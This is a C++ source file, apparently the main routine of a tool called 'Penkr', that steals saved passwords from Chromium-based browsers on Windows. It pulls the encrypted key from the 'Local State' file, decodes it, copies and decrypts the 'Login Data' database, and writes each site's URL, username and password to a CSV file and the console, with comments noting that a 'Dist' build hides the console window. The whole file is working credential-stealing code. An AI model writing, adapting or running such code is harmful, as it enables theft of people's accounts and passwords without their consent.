#include "pch.hpp"
#include "main.hpp"

#include "directories.hpp"
#include "utils.hpp"
#include "csvpass.hpp"
#include "db.hpp"

#include <filesystem>

#ifdef KTN_PLATFORM_WINDOWS
#include <Windows.h>
#include <ShlObj.h>
#endif

namespace Penkr
{
    int Main(int _argc, char** _argv)
    {
        // Create a file output object for the pass.csv file.
        CsvPass csv(Utils::GetPassFile());

        // Iterate through the directories of supported browsers.
        // Currently only support some, and only Chromium based ones.
        for (const auto& dir : Directories)
        {
            // Get the absolute path of the `User Data` and `Default` cache directories
            // If they don't exist, continue to the next browser.
            std::filesystem::path userDataDir, defaultDir;
            if (!Utils::GetAbsolutePath(dir, userDataDir, defaultDir)) continue;

            // Find the encrypted key. The file `Local State` is located in:
            // %localappdata%/<browser path>/User Data/Local State
            // This is a json file containing lots of data, one being the decryption
            // key used for the saved passwords. No idea why this is saved locally.
            // The browser aks for your windows user login, but it's literally
            // not needed as the key is already saved locally. This is the
            // key we use here.
            std::filesystem::path userFile = userDataDir / "Local State";
            std::string data = Utils::ReadFile(userFile);
            auto pos = data.find("encrypted_key");
            if (pos == std::string::npos)
            {
                std::cout << "Failed to find encrypted key!\n";
                continue;
            }
            pos += 16;
            auto endPos = data.find('"', pos);
            if (endPos == std::string::npos)
            {
                std::cout << "Error\n";
                continue;
            }

            // This key is also encoded using both Base64 and Windows Protect Key
            // This utils function takes care of it.
            std::string key = Utils::GetKey(data.substr(pos, endPos - pos));
            
            std::cout << dir.string() << ":\n";

            // The password database is located in:
            // %localappdata%/<browser path>/User Data/Default/Login Data
            // This is a normal database and we use SQLite3 to iterate through it.
            // Everything is normal except the password field, which is a cipher
            // encrypted with AES (Advanced Encryption Standard.
            std::filesystem::path dbFile = defaultDir / "Login Data";

            // Since the user may be using the browser, which would result in
            // a database lock file, we need to copy it locally in order to open
            // it. If the local file already exists however we do delete it first
            // for good measure.
            std::filesystem::path localDbFile = "data.db";
            if (std::filesystem::exists(localDbFile))
                std::filesystem::remove(localDbFile);

            std::filesystem::copy_file(dbFile, localDbFile);

            // Next we load the database. This constructor takes care of the full database
            // scan and decryption, thus why we pass the key.
            PenkrDB db(localDbFile, key);

            // Next up we iterate through each field in the database.
            for (auto& value : db)
            {
                // If the password for whatever reason was empty, which can happen,
                // we do this check to make sure we only log saved passwords.
                if (!value) continue;

                // We then log the password into the csv file.
                csv << value.Url << value.Username << value.Password;

                // We also log the password to the console. This only works
                // when built using Release or Debug, as the console isn't available
                // in Dist builds.
                std::cout << "url: " << value.Url;
                std::cout << "\nname: " << value.Username;
                std::cout << "\npassword: " << value.Password;
                std::cout << "\n\n";
            }

            // We finish the current browser up by deleting the local database file.
            std::filesystem::remove(localDbFile);

        }

        // Lastly we return out of the function. We don't need to manually
        // close the csv handle as it's handled by the destructor of CsvPass.
        return 0;
    }
}